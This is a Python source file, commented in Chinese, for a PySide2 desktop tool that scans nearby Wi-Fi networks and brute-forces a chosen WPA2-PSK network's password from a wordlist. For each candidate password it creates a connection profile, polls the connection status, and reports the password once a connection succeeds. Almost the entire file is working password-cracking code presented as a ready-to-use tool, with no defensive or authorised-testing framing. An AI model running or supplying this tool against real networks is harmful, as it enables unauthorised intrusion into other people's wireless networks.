import threading
import pywifi
from pywifi import const
import time
from PySide2.QtWidgets import *
from PySide2.QtUiTools import QUiLoader
from PySide2.QtCore import QFile, QStringListModel
from PySide2.QtGui import QFont


class Wifi:
    wifi = pywifi.PyWiFi()
    try:
        iface = wifi.interfaces()[0]  # 返回的是一个列表，取第一个wifi网卡
    except Exception as e:
        print("获取网卡列表失败:", e)

    # 获取当前无线网卡信息
    def get_nic(self):
        return self.iface.name()



    # 扫描的wifi列表信息
    def scan_wifi_list(self):
        self.iface.disconnect()  # 断开当前wifi连接
        time.sleep(1)
        assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]  # 检查网卡是否处于断开状态
        self.iface.scan()  # 扫描附近AP
        time.sleep(2)  # 等待扫描完成
        results = self.iface.scan_results()  # 获取扫描结果
        ap_set = set()  # 创建一个set集合，用来存放扫描结果，用来对扫描结果进行去重复处理
        for x in results:
            ap_name = x.ssid.encode('raw_unicode_escape').decode('utf-8')
            ap_set.add(ap_name)
        global ap_list
        ap_list = list(ap_set)
        model_list = QStringListModel()
        model_list.setStringList(ap_list)
        return model_list

    # 开始破解
    def Crack(self, status_list):
        status_list.clear()
        global ssid_name
        global path
        N = 1

        # 读取字典
        try:
            if path[0] != " ":
                print("字典已选择" + path[0])
                with open(path[0], "r") as file:

                    # 遍历所有配置文件
                    profiles = self.iface.network_profiles()
                    for x in profiles:
                        if x.ssid == ssid_name:
                            print(f"发现旧的 '{ssid_name}' 配置，正在移除以确保使用新密码...")
                            self.iface.remove_network_profile(x)
                            break  # 找到并删除后即可退出循环

                    while True:
                        self.iface.disconnect()  # 断开当前wifi连接
                        time.sleep(2)
                        if 'tmp_profile' in locals():
                            self.iface.remove_network_profile(tmp_profile)

                        # 设置配置文件
                        profile = pywifi.Profile()
                        profile.ssid = ssid_name
                        profile.auth = const.AUTH_ALG_OPEN                  # const.AUTH_ALG_OPEN / SHARED
                        profile.akm.append(const.AKM_TYPE_WPA2PSK)          # const.AKM_TYPE_ NONE / WPA/ WPAPSK / WPA2 / WPA2PSK
                        profile.cipher = const.CIPHER_TYPE_CCMP             # const.CIPHER_TYPE_ NONE / WEP / TKIP / CCMP

                        # 获取字典密码
                        tmp_str = file.readline()
                        if tmp_str== '':
                            status_list.addItem(f"{N}. 密码字典已用完")
                            return
                        password = tmp_str.strip()
                        if len(password) >= 8:
                            print(f"tmp_profile：{profile.ssid}")
                            print(f"password：{repr(password)}")
                            profile.key = password
                            tmp_profile = self.iface.add_network_profile(profile)
                            status_list.addItem(f"{N}. 尝试密码：{password}")
                            self.iface.connect(tmp_profile)
                            for i in range(15):
                                time.sleep(1)
                                tmp_status = self.iface.status()
                                print(f"轮询次数{i+1}：iface.status = {tmp_status}")
                                # const.IFACE_CONNECTED / 0 DISCONNECTED /1 SCANNING /2 INACTIVE / 3 CONNECTING /4 CONNECTED /
                                if tmp_status == const.IFACE_CONNECTED:
                                    status_list.addItem(f"{N}. ！！！破解成功！！！：{password}")
                                    return
                        else:
                            if 0 < len(password) <8:
                                status_list.addItem(f"{N}. 不符合要求密码：{password}")
                                continue
                        status_list.scrollToBottom()
                        N += 1
        except Exception as e:
            print(f"攻击异常:{e}")
            return



class Stats:
    def __init__(self):
        self.wifi = Wifi()

        # 从文件加载UI界面
        qfile_stats = QFile("ui_Main.ui")
        qfile_stats.open(QFile.ReadOnly)
        qfile_stats.close()
        self.ui = QUiLoader().load(qfile_stats)

        # UI界面设置网卡信息
        self.ui.comboBox.addItem(self.wifi.get_nic())
        # self.ui.auth.setText("const.AUTH_ALG_WPA2PSK")
        # self.ui.safe.setText("const.AKM_TYPE_WPA2PSK")
        # self.ui.pass_type.setText("const.CIPHER_TYPE_CCMP")

        self.ui.scan_wifi.clicked.connect(self.scan)    # 扫描wifi按钮绑定事件
        self.ui.select_dict.clicked.connect(self.path)   # 选择字典按钮事件
        self.ui.wifi_list.clicked.connect(self.select_wifi_list)    # list被选中
        self.ui.Start_Crack.clicked.connect(self.Crack)  # 破解按钮绑定事件

    def scan(self):
        APs = self.wifi.scan_wifi_list()   # UI界面设置获取的扫描结果
        self.ui.wifi_list.setModel(APs)

    def path(self):
        global path
        path = QFileDialog.getOpenFileName()
        self.ui.textBrowser.setText(path[0])

    def select_wifi_list(self, item):
        global ap_list
        global ssid_name
        ssid_name = ap_list[item.row()]
        self.ui.ssid.setText(ssid_name)

    def Crack(self):
        # 防止界面卡死，开启多线程运行，后台破解
        t1 = threading.Thread(target=self.wifi.Crack, args=(self.ui.status_list,))
        t1.start()


if __name__ == '__main__':
    app = QApplication([])
    font = QFont("Microsoft YaHei", 10)
    app.setFont(font)
    stats1 = Stats()
    stats1.ui.show()
    app.exec_()
